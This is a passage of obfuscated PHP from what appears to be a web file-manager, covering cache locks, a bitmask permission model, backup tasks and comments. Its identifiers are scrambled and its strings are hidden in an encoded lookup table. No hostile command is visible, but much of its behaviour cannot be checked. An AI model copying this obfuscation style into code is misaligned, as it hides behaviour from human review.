Cache::set($¾ò’Ü£, $ñ×ê¢©ˆ, 60); } Cache::removeMemory($¾ò’Ü£); self::runArr($ÑÆÖëéÅ); } public static function finished($˜ÁıôŸ‚, $ğ¤İÄ²ò) { $ñ£ˆÙÏÙ =& $_SERVER[œ—üé‹ê]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ñ£ˆÙÏÙ[342] => $˜ÁıôŸ‚, $ñ£ˆÙÏÙ[2081] => $ğ¤İÄ²ò); } private static function runArr($¹¥‚Ëµ¦) { $¼ƒ¿°Šü =& $_SERVER[œ—üé‹ê]; if (!$¹¥‚Ëµ¦) { return; } foreach ($¹¥‚Ëµ¦ as $õ¦ˆ¹¬« => $œâ½µÅú) { try { Hook::apply($œâ½µÅú[$¼ƒ¿°Šü[342]], $œâ½µÅú[$¼ƒ¿°Šü[2081]]); write_log($¼ƒ¿°Šü[2096] . $õ¦ˆ¹¬« . $¼ƒ¿°Šü[74] . $œâ½µÅú[$¼ƒ¿°Šü[342]] . $¼ƒ¿°Šü[2094] . ACTION, $¼ƒ¿°Šü[195]); } catch (Exception $şûàÏÅ…) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto Cµ‚¼ŞÖàÂ; dÛ½İ™ó•: define($_SERVER[œ—üé‹ê][317], 3); define($_SERVER[œ—üé‹ê][318], 1); define($_SERVER[œ—üé‹ê][319], 0); goto d«Â¨çî; B¡‰·Ô¿: define($_SERVER[œ—üé‹ê][0], $_SERVER[œ—üé‹ê][1]); $_SERVER[ŠòùÈ¨È] = explode($_SERVER[œ—üé‹ê][2], gzinflate(substr($_SERVER[œ—üé‹ê][3], 10, -8))); function binCheckEq($¿çàÓ×É, $ıªªÊ) { return $¿çàÓ×É == $ıªªÊ; } goto BÕó…İ¡¨; Cƒ©Ò¬à…†: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ê­ŠÄ¾´ =& $_SERVER[œ—üé‹ê]; $£¬óÒÁã = $GLOBALS[$Ê­ŠÄ¾´[6]][$Ê­ŠÄ¾´[424]]; self::$cachePath = $£¬óÒÁã[$Ê­ŠÄ¾´[230]][$Ê­ŠÄ¾´[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ì“•îÄè, $„Æ½ÎŸ· = 0) { $ñÆ¨ˆÆ­ =& $_SERVER[œ—üé‹ê]; $ŸëÂö¦á = microtime(!0); $ÈÃßğü¯ = $ŸëÂö¦á + $„Æ½ÎŸ· + 0.0001; $ÄˆôëçŸ = rtrim(self::$cachePath, $ñÆ¨ˆÆ­[8]) . $ñÆ¨ˆÆ­[1029] . md5($Ì“•îÄè) . $ñÆ¨ˆÆ­[1026]; if (file_exists($ÄˆôëçŸ) && filemtime($ÄˆôëçŸ) && filemtime($ÄˆôëçŸ) < time() - 10) { @unlink($ÄˆôëçŸ); } do { if (file_exists($ÄˆôëçŸ)) { cacheLockWait(); continue; } $³Õ©×Ï = fopen($ÄˆôëçŸ, $ñÆ¨ˆÆ­[1030]); if (!$³Õ©×Ï) { return !1; } $Ÿº©µæû = flock($³Õ©×Ï, LOCK_EX | LOCK_NB); self::$caches[$Ì“•îÄè] = array($ñÆ¨ˆÆ­[1031] => $³Õ©×Ï, $ñÆ¨ˆÆ­[230] => $ÄˆôëçŸ); fwrite($³Õ©×Ï, $ÈÃßğü¯); clearstatcache(); if ($³Õ©×Ï && $Ÿº©µæû) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÈÃßğü¯); $this->unlock($Ì“•îÄè); return !1; } public function lockGet($ÜÑËˆˆÂ) { $Ğ£‡‘²— =& $_SERVER[œ—üé‹ê]; $•İÁĞÁ = rtrim(self::$cachePath, $Ğ£‡‘²—[8]) . $Ğ£‡‘²—[1029] . md5($ÜÑËˆˆÂ) . $Ğ£‡‘²—[1026]; return file_exists($•İÁĞÁ); } public function unlock($ÛÑ±¥ÒÖ) { $®ş¡Ä¹„ =& $_SERVER[œ—üé‹ê]; $Ø³ÉÄŠú = self::$caches[$ÛÑ±¥ÒÖ]; if (!$Ø³ÉÄŠú) { return; } @flock($Ø³ÉÄŠú[$®ş¡Ä¹„[1031]], LOCK_UN); @fclose($Ø³ÉÄŠú[$®ş¡Ä¹„[1031]]); @unlink($Ø³ÉÄŠú[$®ş¡Ä¹„[230]]); unset(self::$caches[$ÛÑ±¥ÒÖ]); } } class CacheLockRedis { public function lock($ƒºŠë”, $®âû«¿€ = 10) { $û„ƒûµ® = Cache::init(); $¢ÚÓßìÒ = microtime(!0) + $®âû«¿€; while (microtime(!0) < $¢ÚÓßìÒ) { $ê¡‹·‹¢ = $û„ƒûµ®->get($ƒºŠë”); if (!$ê¡‹·‹¢) { $êƒÇš¸î = $û„ƒûµ®->setLock($ƒºŠë”, $¢ÚÓßìÒ, $®âû«¿€); if ($êƒÇš¸î) { return !0; } } else { if ($ê¡‹·‹¢ < microtime(!0)) { $û„ƒûµ®->set($ƒºŠë”, $¢ÚÓßìÒ, $®âû«¿€ * 2); if ($û„ƒûµ®->get($ƒºŠë”) === $ê¡‹·‹¢) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($êç×—¡‡) { return Cache::init()->get($êç×—¡‡); } public function unlock($©Şñ“) { return Cache::init()->remove($©Şñ“); } } class CacheLockMemcached { public function lock($ÙöÚÄíÆ, $óÊ‰²Ãª = 0) { $¹şì®õÖ = Cache::init(); $ÈÍ‰ÎÕ = microtime(!0) + $óÊ‰²Ãª; while (microtime(!0) < $ÈÍ‰ÎÕ) { $—ÄîŸüƒ = $¹şì®õÖ->get($ÙöÚÄíÆ); if (!$—ÄîŸüƒ || $—ÄîŸüƒ < microtime(!0)) { $–¯’ÈïŒ = $¹şì®õÖ->handle->add($ÙöÚÄíÆ, $ÈÍ‰ÎÕ, $óÊ‰²Ãª); if ($–¯’ÈïŒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($²–‰Ó˜—) { return Cache::init()->get($²–‰Ó˜—); } public function unlock($¸Ã“ò›°) { return Cache::init()->remove($¸Ã“ò›°); } } goto a®ÎÓÓãÑ·; Eœ£®¨†ôæ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ù×¾¼…‚ =& $_SERVER[œ—üé‹ê]; $§†ì¼±  = array(array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2179]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2181], $ù×¾¼…‚[2182] => 1, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2185]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2186], $ù×¾¼…‚[2182] => 2, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2187]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2188], $ù×¾¼…‚[2182] => 3, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2189]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2190], $ù×¾¼…‚[2182] => 4, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => self::AUTH_SHOW | self::AUTH_VIEW), array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2191]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2192], $ù×¾¼…‚[2182] => 5, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2193]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2194], $ù×¾¼…‚[2182] => 6, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ù×¾¼…‚[509] => LNG($ù×¾¼…‚[2195]), $ù×¾¼…‚[2180] => $ù×¾¼…‚[2196], $ù×¾¼…‚[2182] => 7, $ù×¾¼…‚[2183] => 1, $ù×¾¼…‚[2184] => 0)); return $§†ì¼± ; } public static function authCheck($ª¤Ş®´³, $ß¼í÷©¦, $æ‡Œà« = true) { $È§»ª‰ =& $_SERVER[œ—üé‹ê]; $ª¤Ş®´³ = intval($ª¤Ş®´³); if ($æ‡Œà«) { if (KodUser::isRoot() && $GLOBALS[$È§»ª‰[6]][$È§»ª‰[2197]]) { return !0; } } if ($ª¤Ş®´³ <= 0) { return !1; } if (($ª¤Ş®´³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ª¤Ş®´³ & $ß¼í÷©¦); } public static function authCheckShow($Å§¿Ä²æ) { return self::authCheck($Å§¿Ä²æ, self::AUTH_SHOW); } public static function authCheckView($×ŒÂ¬ÇÛ) { return self::authCheck($×ŒÂ¬ÇÛ, self::AUTH_VIEW); } public static function authCheckDownload($Ì…²ØÍ) { return self::authCheck($Ì…²ØÍ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ûìÄ˜§ß) { return self::authCheck($ûìÄ˜§ß, self::AUTH_UPLOAD); } public static function authCheckEdit($Õ“ñŞ† ) { return self::authCheck($Õ“ñŞ† , self::AUTH_EDIT); } public static function authCheckRemove($ßö»œ§ê) { return self::authCheck($ßö»œ§ê, self::AUTH_REMOVE); } public static function authCheckShare($çÁŠ´Şò) { return self::authCheck($çÁŠ´Şò, self::AUTH_SHARE); } public static function authCheckComment($ŸÔ®æÂ…) { return self::authCheck($ŸÔ®æÂ…, self::AUTH_COMMENT); } public static function authCheckEvent($¢ˆë‹é) { return self::authCheck($¢ˆë‹é, self::AUTH_EVENT); } public static function authCheckRoot($ã¶åßÁ) { return self::authCheck($ã¶åßÁ, self::AUTH_ROOT); } public static function authCheckAction($©¤ìˆ¥¶, $¯Œ¤è¾à) { $×·¬¤¾´ =& $_SERVER[œ—üé‹ê]; $á–µáùŠ = array($×·¬¤¾´[1556] => self::AUTH_SHOW, $×·¬¤¾´[1557] => self::AUTH_VIEW, $×·¬¤¾´[1381] => self::AUTH_DOWNLOAD, $×·¬¤¾´[107] => self::AUTH_UPLOAD, $×·¬¤¾´[1558] => self::AUTH_EDIT, $×·¬¤¾´[1330] => self::AUTH_REMOVE, $×·¬¤¾´[1559] => self::AUTH_SHARE, $×·¬¤¾´[429] => self::AUTH_COMMENT, $×·¬¤¾´[1560] => self::AUTH_EVENT, $×·¬¤¾´[1561] => self::AUTH_ROOT); if (!isset($á–µáùŠ[$¯Œ¤è¾à])) { return; } $åÁ™ÇÜ« = $á–µáùŠ[$¯Œ¤è¾à]; $©¤ìˆ¥¶ = intval($©¤ìˆ¥¶); if ($©¤ìˆ¥¶ <= 0) { return !1; } if (($©¤ìˆ¥¶ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($©¤ìˆ¥¶ & $åÁ™ÇÜ«); } public static function authDisable($øş˜¡†, $”ñ¯ƒÁ) { if (intval($øş˜¡†) <= 0) { return 0; } return intval($øş˜¡†) & ~$”ñ¯ƒÁ; } public $optionType = "\x53\x79\x73\164\145\x6d\56\163\157\165\162\143\145\x41\x75\164\x68\114\151\163\x74"; public $field = array("\156\141\155\x65", "\x61\x75\164\150", "\x6c\x61\142\x65\154", "\144\x69\x73\x70\x6c\x61\x79", "\x73\x79\x73\164\145\155", "\x73\x6f\x72\164"); public function initData() { $ØÍ«‘ïí = $this->authDefault(); foreach ($ØÍ«‘ïí as $¯¤‘ãÅ) { $this->add($¯¤‘ãÅ); } } public function findAuth($‰Ø¯ƒ÷, $–ëêÖ¿) { $×ÔÒïÜö =& $_SERVER[œ—üé‹ê]; $ñååËÔ† = parent::listData(); foreach ($ñååËÔ† as $¨ü„ËêÊ) { $Í§–¬–Á = intval($¨ü„ËêÊ[$×ÔÒïÜö[502]]); if ($Í§–¬–Á <= 0 || $¨ü„ËêÊ[$×ÔÒïÜö[2198]] == 0) { continue; } if (($Í§–¬–Á & $‰Ø¯ƒ÷) != $‰Ø¯ƒ÷) { continue; } if (($Í§–¬–Á & $–ëêÖ¿) != 0) { continue; } return $¨ü„ËêÊ[$×ÔÒïÜö[487]]; } return !1; } public function findAuthMax($¸Á·ŒíÄ, $–¸¯úâ) { $õ¿ÏŞÃÌ =& $_SERVER[œ—üé‹ê]; $œ‡ç™ = !1; $­²ÏŞØÓ = parent::listData(); foreach ($­²ÏŞØÓ as $“ÀàÉ¨Ñ) { $ãåÜîĞ… = intval($“ÀàÉ¨Ñ[$õ¿ÏŞÃÌ[502]]); if ($ãåÜîĞ… <= 0 || $“ÀàÉ¨Ñ[$õ¿ÏŞÃÌ[2198]] == 0) { continue; } if (($ãåÜîĞ… & $¸Á·ŒíÄ) != $¸Á·ŒíÄ) { continue; } if (($ãåÜîĞ… & $–¸¯úâ) != 0) { continue; } if (!$œ‡ç™) { $œ‡ç™ = $“ÀàÉ¨Ñ; continue; } if (intval($œ‡ç™[$õ¿ÏŞÃÌ[502]]) < $ãåÜîĞ…) { $œ‡ç™ = $“ÀàÉ¨Ñ; } } return $œ‡ç™ ? $œ‡ç™[$õ¿ÏŞÃÌ[487]] : !1; } public function findAuthReadOnly() { $Áİ°¸÷½ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Û²ùóŠú = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Áİ°¸÷½, $Û²ùóŠú); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $×§Å¿åï =& $_SERVER[œ—üé‹ê]; $³ïÊä— = parent::listData(); $Ş÷¬™ıŸ = !1; foreach ($³ïÊä— as $šŒ†¡ıÍ) { if ($šŒ†¡ıÍ[$×§Å¿åï[502]] <= 0 || $šŒ†¡ıÍ[$×§Å¿åï[2198]] == $×§Å¿åï[228]) { continue; } if (!$Ş÷¬™ıŸ) { $Ş÷¬™ıŸ = $šŒ†¡ıÍ; continue; } if ($Ş÷¬™ıŸ[$×§Å¿åï[502]] > $šŒ†¡ıÍ[$×§Å¿åï[502]]) { $Ş÷¬™ıŸ = $šŒ†¡ıÍ; } } return $Ş÷¬™ıŸ ? $Ş÷¬™ıŸ[$×§Å¿åï[487]] : $×§Å¿åï[12]; } public function listData($®ƒÅ¶¦º = false, $¹àÕ¥íÔ = "\163\x6f\162\x74", $æ„–¼ç = false) { return parent::listData($®ƒÅ¶¦º, $¹àÕ¥íÔ, $æ„–¼ç); } public function update($ï¿ÃõÛ‰, $º•‘å) { $ÁøåŒ¿¹ =& $_SERVER[œ—üé‹ê]; $Ï½âì£ = parent::listData($ï¿ÃõÛ‰); $Äìæë¤¡ = $this->findByName($º•‘å[$ÁøåŒ¿¹[32]]); if (!$Ï½âì£ || $Äìæë¤¡ && $Äìæë¤¡[$ÁøåŒ¿¹[487]] != $Ï½âì£[$ÁøåŒ¿¹[487]]) { return !1; } $this->filterAuth($º•‘å[$ÁøåŒ¿¹[502]]); return parent::update($ï¿ÃõÛ‰, $º•‘å); } public function remove($†ç äéÔ) { $ÙÈÂñŞÕ = parent::listData($†ç äéÔ); if (!$ÙÈÂñŞÕ || $ÙÈÂñŞÕ[$_SERVER[œ—üé‹ê][189]]) { return !1; } return parent::remove($†ç äéÔ); } public function add($Üé§ÚÒ = array()) { $ëÛê¸âŞ =& $_SERVER[œ—üé‹ê]; if ($this->findByName($Üé§ÚÒ[$ëÛê¸âŞ[32]])) { return !1; } $©‘ŸœÙ± = array($ëÛê¸âŞ[32] => $ëÛê¸âŞ[12], $ëÛê¸âŞ[502] => 1, $ëÛê¸âŞ[2199] => $ëÛê¸âŞ[2188], $ëÛê¸âŞ[2198] => 1, $ëÛê¸âŞ[189] => 0, $ëÛê¸âŞ[2200] => 0); $Üé§ÚÒ = array_merge($©‘ŸœÙ±, $Üé§ÚÒ); $Üé§ÚÒ[$ëÛê¸âŞ[2200]] = $this->getSort(); $this->filterAuth($Üé§ÚÒ[$ëÛê¸âŞ[502]]); return parent::insert($Üé§ÚÒ); } private function getSort() { $ÎˆİèõÈ =& $_SERVER[œ—üé‹ê]; $ãåÉí… = parent::listData(); $ß¨©¢â— = array_to_keyvalue($ãåÉí…, $ÎˆİèõÈ[12], $ÎˆİèõÈ[2200]); return empty($ß¨©¢â—) ? 0 : max($ß¨©¢â—) + 1; } private function filterAuth(&$¯ÜÆÄ™á) { if (!$¯ÜÆÄ™á) { return; } $€¡Œ¾êò = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $µÖÑ¥ì§ = array(); foreach ($€¡Œ¾êò as $Â¼¨¿Ê) { if ($¯ÜÆÄ™á & $Â¼¨¿Ê) { $µÖÑ¥ì§[] = $Â¼¨¿Ê; } } if (in_array(self::AUTH_ROOT, $µÖÑ¥ì§)) { $¯ÜÆÄ™á = array_sum($€¡Œ¾êò); return; } $Ãòış±÷ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($µÖÑ¥ì§ as $Â¼¨¿Ê) { if (isset($Ãòış±÷[$Â¼¨¿Ê])) { $µÖÑ¥ì§ = array_merge($µÖÑ¥ì§, $Ãòış±÷[$Â¼¨¿Ê]); } } $µÖÑ¥ì§[] = self::AUTH_SHOW; $¯ÜÆÄ™á = array_sum(array_unique($µÖÑ¥ì§)); } public function sort($˜Ö°Õ€, $¾ùï‰™æ) { return parent::update($˜Ö°Õ€, $¾ùï‰™æ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x62\x61\143\x6b\165\x70\114\x69\163\164"; public $field = array("\151\157", "\156\x61\x6d\145", "\x73\164\141\164\x75\x73", "\143\x6f\156\x74\x65\x6e\164", "\x6d\x61\x6e\165\141\x6c", "\x72\x65\x73\x75\154\164", "\164\x69\x6d\x65\106\x72\157\155", "\x74\x69\155\x65\124\x6f"); public $autoTask = "\141\x64\155\x69\x6e\x2e\x62\141\x63\153\165\x70\56\x61\165\164\157\x54\x61\x73\x6b"; public $fileTask = "\141\144\x6d\x69\156\56\x62\141\x63\153\x75\160\56\x66\151\x6c\145\124\x61\x73\153"; public function config($é‘¾Ü´Å = false) { $ÈŠ˜Û÷£ =& $_SERVER[œ—üé‹ê]; $•±ãÍ¿Š = $this->configSimple(); Action($ÈŠ˜Û÷£[2201])->taskInit($•±ãÍ¿Š); if (!$é‘¾Ü´Å) { return $•±ãÍ¿Š; } $úºçØì = array(); if (Model($ÈŠ˜Û÷£[882])->get($ÈŠ˜Û÷£[2202], $ÈŠ˜Û÷£[888]) == $ÈŠ˜Û÷£[2203]) { Model($ÈŠ˜Û÷£[1943])->cacheClear(); $úºçØì = Model($ÈŠ˜Û÷£[2204])->findByKey($ÈŠ˜Û÷£[1560], $this->autoTask); if (!$úºçØì) { $úºçØì = array(); } if (isset($úºçØì[$ÈŠ˜Û÷£[204]])) { $úºçØì[$ÈŠ˜Û÷£[204]] = json_decode($úºçØì[$ÈŠ˜Û÷£[204]], !0); } if (isset($•±ãÍ¿Š[$ÈŠ˜Û÷£[204]])) { $úºçØì[$ÈŠ˜Û÷£[204]][$ÈŠ˜Û÷£[1947]] = $•±ãÍ¿Š[$ÈŠ˜Û÷£[204]]; unset($•±ãÍ¿Š[$ÈŠ˜Û÷£[204]]); } } $•±ãÍ¿Š = array_merge($úºçØì, $•±ãÍ¿Š); if ($•±ãÍ¿Š[$ÈŠ˜Û÷£[168]] == $ÈŠ˜Û÷£[953]) { $¤Ûöõò = Model($ÈŠ˜Û÷£[882])->get($ÈŠ˜Û÷£[952], $ÈŠ˜Û÷£[888]); $•±ãÍ¿Š[$ÈŠ˜Û÷£[2205]] = json_decode($¤Ûöõò, !0); } return $•±ãÍ¿Š; } public function configSimple() { $¦İÎååî =& $_SERVER[œ—üé‹ê]; $½õŞ’ĞÅ = Model($¦İÎååî[882])->get($¦İÎååî[888]); $½õŞ’ĞÅ = json_decode($½õŞ’ĞÅ, !0); if (!$½õŞ’ĞÅ) { $½õŞ’ĞÅ = array($¦İÎååî[1944] => 0); } $½õŞ’ĞÅ[$¦İÎååî[1944]] = _get($½õŞ’ĞÅ, $¦İÎååî[1944], 1); $this->parseContent($½õŞ’ĞÅ); if ($½õŞ’ĞÅ[$¦İÎååî[168]] == $¦İÎååî[953] && Model($¦İÎååî[882])->get($¦İÎååî[971]) == $¦İÎååî[972]) { $½õŞ’ĞÅ[$¦İÎååî[168]] = $¦İÎååî[1304]; } return $½õŞ’ĞÅ; } public function listData($ß÷¾ã›  = false, $À´¨„‰Ò = "\x6d\x6f\x64\151\x66\x79\x54\x69\x6d\x65", $»¬Ú‰–Â = false) { $àğíä™´ = parent::listData($ß÷¾ã› , $À´¨„‰Ò, !0); if (!$àğíä™´) { return $àğíä™´; } if ($ß÷¾ã› ) { $àğíä™´ = array($àğíä™´); } foreach ($àğíä™´ as &$¸®±”Ş) { $this->parseContent($¸®±”Ş); } return $ß÷¾ã›  ? $àğíä™´[0] : $àğíä™´; } public function parseContent(&$³øËÁ·) { $Æ®ıÏÓ— =& $_SERVER[œ—üé‹ê]; $ãëÊç‡· = _get($³øËÁ·, $Æ®ıÏÓ—[168], $Æ®ıÏÓ—[91]); if (!in_array($ãëÊç‡·, array($Æ®ıÏÓ—[953], $Æ®ıÏÓ—[1304]))) { $³øËÁ·[$Æ®ıÏÓ—[168]] = $ãëÊç‡· == $Æ®ıÏÓ—[91] ? $Æ®ıÏÓ—[1304] : $Æ®ıÏÓ—[953]; } } public function lastItem() { $äùä½ú = $this->listData(); return !empty($äùä½ú[0]) ? $äùä½ú[0] : null; } public function kill($¾±„¡ËÊ) { $Êõƒ‡çË =& $_SERVER[œ—üé‹ê]; $àƒî¤ç = $this->listData($¾±„¡ËÊ); if (!$àƒî¤ç || empty($àƒî¤ç[$Êõƒ‡çË[32]])) { return !0; } Task::kill($Êõƒ‡çË[895]); Task::kill($Êõƒ‡çË[915]); Task::kill($Êõƒ‡çË[926]); $®µæåâû = $àƒî¤ç[$Êõƒ‡çË[32]]; $êó‘˜•Š = TEMP_FILES . $Êõƒ‡çË[891] . $®µæåâû . $Êõƒ‡çË[8]; IO::remove($êó‘˜•Š, !1); return $this->remove($¾±„¡ËÊ); } public function remove($óØè¬óã) { $şëÕÔ‡¿ = $this->listData($óØè¬óã); if (!$şëÕÔ‡¿) { return !0; } return $this->backupRemove($şëÕÔ‡¿); } private function backupRemove($÷„¢Ÿ¬Š) { parent::remove($÷„¢Ÿ¬Š[$_SERVER[œ—üé‹ê][487]]); $…¾¦ Å™ = $this->backupPath($÷„¢Ÿ¬Š); IO::remove($…¾¦ Å™, !1); return !0; } private function backupPath($›Ï¶³É) { $¯ŞŠ¶¹ï =& $_SERVER[œ—üé‹ê]; $ºúü×Âê = $›Ï¶³É[$¯ŞŠ¶¹ï[32]]; $åáğ†Á¢ = Model($¯ŞŠ¶¹ï[882])->get($¯ŞŠ¶¹ï[883]); $Âİ¥¢Œñ = substr(md5($¯ŞŠ¶¹ï[884] . $åáğ†Á¢ . $ºúü×Âê), 0, 8); return "\x7b\151\157\72{$›Ï¶³É[$¯ŞŠ¶¹ï[861]]}\x7d\x2f\x64\x61\164\141\142\x61\163\145\57\142\141\x63\153\165\160\x2f" . $ºúü×Âê . $¯ŞŠ¶¹ï[11] . $Âİ¥¢Œñ; } public function start($ªùŸ£Şì = "\144\x62") { $¾„µŒÔâ =& $_SERVER[œ—üé‹ê]; if ($GLOBALS[$¾„µŒÔâ[6]][$¾„µŒÔâ[92]][$¾„µŒÔâ[2206]] != $¾„µŒÔâ[91]) { return !0; } $¯ûø÷¾ö = $this->configSimple(); if (!$¯ûø÷¾ö || $¯ûø÷¾ö[$¾„µŒÔâ[1944]] != $¾„µŒÔâ[91]) { return !1; } if ($ªùŸ£Şì == $¾„µŒÔâ[230]) { return $this->bakFile($¯ûø÷¾ö); } $‘ô´ãñ = $this->process(); foreach ($‘ô´ãñ as $¯ÙÍÜøÀ) { if ($¯ÙÍÜøÀ) { return Task::restart($¯ÙÍÜøÀ[$¾„µŒÔâ[487]]); } } $ıªŠâğá = new Backup(); if (!$ıªŠâğá || $ıªŠâğá->message) { return !1; } $ˆÏâ•¼ = $ıªŠâğá->db(); if ($ˆÏâ•¼) { $ˆÏâ•¼ = $ıªŠâğá->dbFile(); if ($ˆÏâ•¼ && $¯ûø÷¾ö[$¾„µŒÔâ[168]] == $¾„µŒÔâ[953]) { $ˆÏâ•¼ = $ıªŠâğá->file(); } } Backup::set(array($¾„µŒÔâ[859] => 1, $¾„µŒÔâ[871] => time())); return !0; } public function process() { $Ğæó‚×ç =& $_SERVER[œ—üé‹ê]; $ãº›¶Î½ = array($Ğæó‚×ç[867] => Task::get($Ğæó‚×ç[895]), $Ğæó‚×ç[872] => Task::get($Ğæó‚×ç[915]), $Ğæó‚×ç[230] => Task::get($Ğæó‚×ç[926])); $³¦­«ç° = !1; foreach ($ãº›¶Î½ as &$¤£Ûä§ı) { if ($³¦­«ç°) { $¤£Ûä§ı = !1; continue; } if ($¤£Ûä§ı) { $óÄ··ÇË = intval(_get($¤£Ûä§ı, $Ğæó‚×ç[1978], 0)); if (time() - $óÄ··ÇË > 7200) { Task::kill($¤£Ûä§ı[$Ğæó‚×ç[487]]); $³¦­«ç° = !0; $¤£Ûä§ı = !1; } } } return $ãº›¶Î½; } public function bakFile($ÊÑÎæ—ù) { $ûéÃªØ‡ =& $_SERVER[œ—üé‹ê]; if ($ÊÑÎæ—ù[$ûéÃªØ‡[168]] == $ûéÃªØ‡[1304]) { return !1; } Model($ûéÃªØ‡[1943])->cacheClear(); $êªö™ë = Model($ûéÃªØ‡[2204])->findByKey($ûéÃªØ‡[1560], $this->fileTask); if (!$êªö™ë) { return !1; } $¿‹øè—× = json_decode($êªö™ë[$ûéÃªØ‡[204]], !0); if (!$¿‹øè—× || $¿‹øè—×[$ûéÃªØ‡[33]] != $ûéÃªØ‡[1956]) { return !1; } $¿‹øè—× = intval($¿‹øè—×[$ûéÃªØ‡[1956]]); if ($¿‹øè—× <= 0) { return !1; } $õ‚ò‹ó­ = new BackupFile(!0); return $õ‚ò‹ó­->start($ÊÑÎæ—ù[$ûéÃªØ‡[861]], $¿‹øè—×); } public function restore() { $¬Öô¼³ =& $_SERVER[œ—üé‹ê]; ActionCall($¬Öô¼³[2207], !0, 1); ActionCall($¬Öô¼³[2207], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\x6e\164"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\x65" => "\143\157\155\155\145\x6e\164\x5f\155\x65\x74\x61", "\155\x65\x74\x61\106\151\145\x6c\144" => "\143\x6f\155\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($áŞº˜Í€) { $Ø¯êşìß =& $_SERVER[œ—üé‹ê]; if ($áŞº˜Í€[$Ø¯êşìß[2208]]) { $Å«‡óú = $this->where(array($Ø¯êşìß[2209] => $áŞº˜Í€[$Ø¯êşìß[2208]]))->find(); if (!$Å«‡óú || $Å«‡óú[$Ø¯êşìß[188]] != $áŞº˜Í€[$Ø¯êşìß[188]] || $Å«‡óú[$Ø¯êşìß[589]] != $áŞº˜Í€[$Ø¯êşìß[589]]) { return !1; } $this->where(array($Ø¯êşìß[2209] => $áŞº˜Í€[$Ø¯êşìß[2208]]))->setAdd($Ø¯êşìß[2210], 1); } $áŞº˜Í€[$Ø¯êşìß[2211]] = 0; $áŞº˜Í€[$Ø¯êşìß[2210]] = 0; $áŞº˜Í€[$Ø¯êşìß[859]] = 1; return $this->add($áŞº˜Í€); } public function commentCount($ˆ­òº¶, $ª ÅÄ, 